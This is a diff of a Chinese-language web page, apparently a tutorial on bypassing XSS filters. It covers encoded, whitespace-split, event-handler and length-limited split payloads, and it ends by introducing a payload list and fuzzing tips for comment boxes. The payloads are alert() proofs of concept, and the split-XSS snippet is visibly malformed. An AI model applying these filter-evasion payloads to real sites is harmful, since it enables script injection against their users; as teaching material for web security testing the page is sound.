@@ -1020,21 +1020,21 @@
 <p><code>&lt;script&gt;String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88,83, 83, 34, 41, 59)&lt;/script&gt;</code></p>
 <p>String.fromCharCode()是javascript中的字符串方法，用来把ASCII转换为字符串。</p>
 <p>最后使用<code>&lt;script&gt;转换后的放到这里&lt;/script&gt;</code>包含即可。</p>
-<h3 id="利用-lt-gt-标记注射Html-Javascript"><a href="#利用-lt-gt-标记注射Html-Javascript" class="headerlink" title="利用&lt;&gt;标记注射Html/Javascript"></a>利用&lt;&gt;标记注射Html/Javascript</h3><p>如果用户能随心所欲引入&lt;&gt;标记，那他就能操作HTML标记，然后就能通过<script>标签插入JS恶意脚本了，例如：</p>
+<h3 id="利用-lt-gt-标记注射Html-Javascript"><a href="#利用-lt-gt-标记注射Html-Javascript" class="headerlink" title="利用&lt;&gt;标记注射Html/Javascript"></a>利用&lt;&gt;标记注射Html/Javascript</h3><p>如果用户能随心所欲引入&lt;&gt;标记，那他就能操作HTML标记，然后就能通过<code>&lt;script&gt;</code>标签插入JS恶意脚本了，例如：</p>
 <p><code>&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;</code></p>
-<p>当然如果对"<>"和script等进行了过滤，上面这个就无法执行了</p>
+<p>当然如果对”&lt;&gt;”和script等进行了过滤，上面这个就无法执行了</p>
 <h3 id="利用HTML标签属性值执行XSS"><a href="#利用HTML标签属性值执行XSS" class="headerlink" title="利用HTML标签属性值执行XSS"></a>利用HTML标签属性值执行XSS</h3><p>很多HTML标记中的属性都支持javascript:[code]伪协议的形式，这就给了注入XSS可乘之机,例如：</p>
 <p><code>&lt;img src = &quot;javascript:alert(&#39;xss&#39;);&quot;&gt;</code></p>
-<p>这里即便对传入的参数过滤了<>,XSS还是能发生(前提是该标签属性需要引用文件)</p>
+<p>这里即便对传入的参数过滤了&lt;&gt;,XSS还是能发生(前提是该标签属性需要引用文件)</p>
 <h3 id="空格-回车-Tab"><a href="#空格-回车-Tab" class="headerlink" title="空格/回车/Tab"></a>空格/回车/Tab</h3><p>假设过滤函数进一步又过滤了javascript等敏感字符串，只需对javascript进行小小的操作即可绕过，例如：</p>
 <p>　<code>&lt;img src= &quot;java　　script:alert(&#39;xss&#39;);&quot; width=100&gt;</code></p>
 <p>这里之所以能成功绕过，其实还得益于JS自身的性质：Javascript通常以分号结尾，如果解析引擎能确定一个语句时完整的，且行尾有换行符，则分号可省略</p>
 <p>而如果不是完整的语句，javascript则会继续处理，直到语句完整结束或分号。</p>
 <p>像<code>&lt;img src= &quot;javascript:　alert(/xss/); width=100&gt;</code> 同样能绕过</p>
 <h3 id="对标签属性值进行转码"><a href="#对标签属性值进行转码" class="headerlink" title="对标签属性值进行转码"></a>对标签属性值进行转码</h3><p>过滤严谨的函数很可能对标签也进行了严格的控制，但是如果用其他形式表示标签,脚本仍能解析却可以绕过过滤</p>
-<p>常见的编码方式有：HTML实体编码(&#ASCII),十进制、十六进制、八进制编码，unicode编码及escape编码及使用String.fromCharCode(...)绕过</p>
+<p>常见的编码方式有：HTML实体编码(&amp;#ASCII),十进制、十六进制、八进制编码，unicode编码及escape编码及使用String.fromCharCode(…)绕过</p>
 <p>因此<code>&lt;img src= &quot;javascript&amp;#116&amp;#alert(/xss/);&quot;&gt;</code>可以实现绕过</p>
-<p>另外还可以把&#01、&#02、&#09等字符插入代码的头部或任意地方</p>
+<p>另外还可以把&amp;#01、&amp;#02、&amp;#09等字符插入代码的头部或任意地方</p>
 <h3 id="产生自己的事件"><a href="#产生自己的事件" class="headerlink" title="产生自己的事件"></a>产生自己的事件</h3><p>如果不能依靠属性进行跨站，那么还可以利用事件处理函数</p>
 <p><code>&lt;input type = &quot;button&quot; value = &quot;clickme&quot; οnclick=&quot;alert(&#39;click me&#39;)&quot; /&gt;</code></p>
 <p>事件既能让JS脚本运行，自然也可以执行跨站，另外像onerror、onMouseover等都可利用的是事件处理函数</p>
@@ -1046,12 +1046,12 @@
 <p>不使用引号或者构造全角字符也能扰乱过滤规则</p>
 <p>还有像CSS中/**/会被浏览器忽略，\和\0同样或被浏览器忽略，同样可以用来绕过：</p>
 <p><code>&lt;img src =&quot;java/*javascript:alert(&#39;xss&#39;)*/script:alert(1);&quot;&gt;</code></p>
-<h3 id="充分利用字符编码"><a href="#充分利用字符编码" class="headerlink" title="充分利用字符编码"></a>充分利用字符编码</h3><p>上面说到过编码，这里加以补充，除了像&#ASCII，其实也可以采用&#0、&#00、&#000等形式，同样&#x6a的形式也是可以的</p>
+<h3 id="充分利用字符编码"><a href="#充分利用字符编码" class="headerlink" title="充分利用字符编码"></a>充分利用字符编码</h3><p>上面说到过编码，这里加以补充，除了像&amp;#ASCII，其实也可以采用&amp;#0、&amp;#00、&amp;#000等形式，同样&amp;#x6a的形式也是可以的</p>
 <p><code>&lt;script&gt;eval(&quot;\61\6c\65......&quot;);&lt;script&gt;</code></p>
 <p>如果使用eval执行10进制形式的脚本则需要配合string.fromcharcode()使用</p>
 <h3 id="拆分跨站法"><a href="#拆分跨站法" class="headerlink" title="拆分跨站法"></a>拆分跨站法</h3><p>拆分跨站就是像shellcode一样，遇到长度限制不能按正常方式跨站时，通过引入变量多次提交将之连接起来实现跨站，例如：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;z=‘<span class="built_in">document</span>.‘&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;script&gt;z=+'write'("''&lt;/</span>script&gt;</span><br><span class="line">&lt;script&gt;z=z+<span class="string">''</span>&lt;script<span class="string">'&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
-<p>......</p>
+<p>……</p>
 <p><code>&lt;script&gt;eval(z)&lt;/script&gt;</code><br>另外除了像上面多次提交，也可以引用其他变量如：eval(qUserInfo.spaceName)形式，由于qUserInfo.spaceName是可控变量，因此改变其值就可以绕过长度限制了</p>
 <h2 id="0x05-一些Payload"><a href="#0x05-一些Payload" class="headerlink" title="0x05 一些Payload"></a>0x05 一些Payload</h2><p>这里放一些由事件触发的payload 自己拿这些事件做了下实验还是挺好玩的 </p>
 <p>FUZZ思路就是选弹框不一样payload直接全放进去一般指富文本编辑器或者留言框 其他的就用爆破把 注意线程就好了</p>
